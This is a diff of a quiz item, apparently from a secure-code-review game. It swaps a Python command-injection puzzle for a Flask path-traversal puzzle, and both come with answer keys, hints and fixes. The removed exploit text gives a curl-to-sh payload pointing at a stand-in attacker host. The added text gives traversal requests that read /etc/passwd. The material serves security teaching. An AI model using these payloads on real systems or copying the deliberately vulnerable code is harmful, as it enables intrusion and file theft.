@@ -1,5 +1,5 @@
 {
-  "id": "srd-0004",
+  "id": "srd-0007",
   "date": "2026-10-11",
   "difficulty": "easy",
   "language": "python",
@@ -7,49 +7,47 @@
   "snippet": {
     "files": [
       {
-        "name": "backup.py",
-        "code": "import os\n\ndef backup_site(hostname):\n    # Ping the host, then rsync its web root into local backups.\n    os.system(\"ping -c 1 \" + hostname)\n    cmd = \"rsync -az %s:/var/www/ ./backups/%s/\" % (hostname, hostname)\n    os.system(cmd)\n    return \"./backups/\" + hostname\n\ndef handle_request(form):\n    host = form.get(\"host\")\n    return backup_site(host)\n",
+        "name": "download.py",
+        "code": "import os\nfrom flask import send_file, request\n\nUPLOAD_DIR = \"/srv/app/uploads\"\n\ndef download():\n    # Serve a file the user previously uploaded.\n    filename = request.args.get(\"name\")\n    path = os.path.join(UPLOAD_DIR, filename)\n    return send_file(path)\n",
         "notes": {
-          "5": "Runs `ping` by handing a string to the system shell, with `hostname` appended to it.",
-          "6": "Builds an rsync command string with the hostname substituted in twice.",
-          "7": "Runs that rsync command through the shell.",
-          "8": "Returns the local path the backup was written to.",
-          "11": "Reads the `host` field straight from the incoming request.",
-          "12": "Passes it into backup_site."
+          "4": "The directory that user uploads are supposed to live in.",
+          "8": "Reads the `name` parameter from the query string — fully attacker-controlled.",
+          "9": "Joins the upload directory with that name to form the path to read.",
+          "10": "Streams whatever file is at `path` back to the client."
         }
       }
     ]
   },
   "stages": {
     "line": {
-      "file": "backup.py",
-      "line": 5,
+      "file": "download.py",
+      "line": 9,
       "yellowRadius": 2,
       "maxGuesses": 5
     },
     "bugClass": {
-      "answer": "command-inj",
+      "answer": "path-traversal",
       "options": [
-        "command-inj",
-        "sqli",
         "path-traversal",
+        "zip-slip",
         "ssrf",
-        "code-inj"
+        "idor",
+        "command-inj"
       ]
     },
     "why": {
       "answerIndex": 1,
       "options": [
         {
-          "label": "`ping` needs root privileges, so the call fails for unprivileged web users",
-          "whyWrong": "Privilege level isn't the issue; the problem is that the shell interprets the input before anything runs."
+          "label": "`send_file` reads the entire file into memory, so a large file exhausts RAM",
+          "whyWrong": "Memory use isn't the issue; the problem is which file can be selected in the first place."
         },
         {
-          "label": "`os.system` hands the whole assembled string to `/bin/sh`, so shell metacharacters in `hostname` run as separate commands"
+          "label": "`filename` is attacker-controlled and never confined, so `../` sequences or an absolute path make the join resolve outside `UPLOAD_DIR`"
         },
         {
-          "label": "The return value exposes the internal backup directory path to the user",
-          "whyWrong": "Leaking a path name is minor and unrelated to the command execution flaw."
+          "label": "If the file doesn't exist, `send_file` raises and returns a 500 error",
+          "whyWrong": "A 500 on a missing file is a robustness nit, not the vulnerability."
         }
       ]
     },
@@ -57,23 +55,23 @@
       "answerIndex": 2,
       "options": [
         {
-          "label": "Quote the hostname inside the shell string",
-          "diff": "-    os.system(\"ping -c 1 \" + hostname)\n+    os.system(\"ping -c 1 '\" + hostname + \"'\")",
-          "whyWrong": "Single quotes are defeated by a `'` in the input, which closes the quote and restarts command context. Quoting by hand is not a reliable boundary."
+          "label": "Reject names containing '../'",
+          "diff": "+    if \"../\" in filename:\n+        abort(400)\n     path = os.path.join(UPLOAD_DIR, filename)",
+          "whyWrong": "Misses absolute paths (`/etc/passwd`), backslashes, URL-encoded and overlong forms. os.path.join also discards the base entirely when given an absolute second argument."
         },
         {
-          "label": "Remove semicolons from the hostname",
-          "diff": "+    hostname = hostname.replace(\";\", \"\")\n     os.system(\"ping -c 1 \" + hostname)",
-          "whyWrong": "Shells offer many other separators (`|`, `&&`, `$(...)`, backticks, newlines). Denylisting one character leaves the rest open."
+          "label": "URL-decode the filename before joining",
+          "diff": "+    filename = urllib.parse.unquote(filename)\n     path = os.path.join(UPLOAD_DIR, filename)",
+          "whyWrong": "Decoding does nothing to confine the path; it arguably helps the attacker by normalising their traversal sequences."
         },
         {
-          "label": "Pass arguments as a list with shell=False (subprocess)",
-          "diff": "-    os.system(\"ping -c 1 \" + hostname)\n+    subprocess.run([\"ping\", \"-c\", \"1\", hostname], check=True)\n-    cmd = \"rsync -az %s:/var/www/ ./backups/%s/\" % (hostname, hostname)\n-    os.system(cmd)\n+    subprocess.run([\"rsync\", \"-az\", f\"{hostname}:/var/www/\", f\"./backups/{hostname}/\"], check=True)"
+          "label": "Strip directories, then confirm the resolved path stays in UPLOAD_DIR",
+          "diff": "-    path = os.path.join(UPLOAD_DIR, filename)\n+    safe = os.path.basename(filename)\n+    path = os.path.realpath(os.path.join(UPLOAD_DIR, safe))\n+    if os.path.commonpath([path, UPLOAD_DIR]) != UPLOAD_DIR:\n+        abort(403)\n     return send_file(path)"
         },
         {
-          "label": "Run the commands as an unprivileged user",
-          "diff": "-    os.system(\"ping -c 1 \" + hostname)\n+    os.system(\"sudo -u nobody ping -c 1 \" + hostname)",
-          "whyWrong": "Dropping privileges limits blast radius but the input is still parsed by a shell, so arbitrary commands still run (as nobody)."
+          "label": "Serve the file only if it exists",
+          "diff": "     path = os.path.join(UPLOAD_DIR, filename)\n+    if not os.path.exists(path):\n+        abort(404)\n     return send_file(path)",
+          "whyWrong": "An existence check does not confine the path. `/etc/passwd` exists and would be served."
         }
       ]
     }
@@ -84,28 +82,28 @@
     "attribution": "SourceReadle original"
   },
   "training": {
-    "exploit": "Submit `host=localhost; curl http://evil.example/s | sh`. `ping -c 1 localhost` runs, then the shell sees the `;` and executes `curl ... | sh`, downloading and running the attacker's script as the web user. `$(...)`, backticks, `&&`, and `|` work too.",
+    "exploit": "Request `?name=../../../../etc/passwd` to climb out of the upload directory, or the simpler `?name=/etc/passwd` — because `os.path.join(base, '/etc/passwd')` discards `base` entirely when the second argument is absolute. Either way the server reads and returns an arbitrary file.",
     "concepts": [
-      "CWE-78",
-      "OWASP A03:2021 Injection"
+      "CWE-22",
+      "OWASP A01:2021"
     ],
     "hints": {
-      "line": "Which calls pass a built-up string to the operating system?",
-      "bugClass": "The input reaches a shell, not a database.",
-      "why": "What does `/bin/sh` do with a `;` in the middle of the string?",
-      "fix": "Don't involve a shell at all — pass arguments as a list."
+      "line": "Find where the user's input becomes part of a filesystem path.",
+      "bugClass": "The input steers which path is read.",
+      "why": "What happens to `os.path.join` when the second argument starts with `/`?",
+      "fix": "Resolve the final path and confirm it's still inside UPLOAD_DIR."
     }
   },
   "writeup": {
-    "summary": "`os.system` hands its string to `/bin/sh`, so any shell metacharacter in `hostname` is interpreted. A host of `localhost; curl evil.sh | sh` runs the attacker's command. The fix stops using a shell at all: `subprocess.run([...])` with a list passes `hostname` as a single argv element, so it can never be parsed as a command. Note line 6 has the same flaw — a complete fix converts both calls.",
+    "summary": "`filename` comes from the query string and is joined to `UPLOAD_DIR` with no confinement. `?name=../../../../etc/passwd` escapes the upload directory; `?name=/etc/passwd` is worse, because `os.path.join(base, '/etc/passwd')` returns `/etc/passwd` — an absolute second argument throws the base away entirely. The fix reduces the input to a bare filename with `basename`, resolves the final path with `realpath`, and verifies it is still inside `UPLOAD_DIR` before serving. Validate the resolved path, don't blocklist characters.",
     "readNext": [
       {
-        "label": "Python subprocess security considerations",
-        "url": "https://docs.python.org/3/library/subprocess.html#security-considerations"
+        "label": "OWASP Path Traversal",
+        "url": "https://owasp.org/www-community/attacks/Path_Traversal"
       },
       {
-        "label": "OWASP Command Injection",
-        "url": "https://owasp.org/www-community/attacks/Command_Injection"
+        "label": "Flask send_file / send_from_directory docs",
+        "url": "https://flask.palletsprojects.com/en/latest/api/#flask.send_from_directory"
       }
     ]
   }
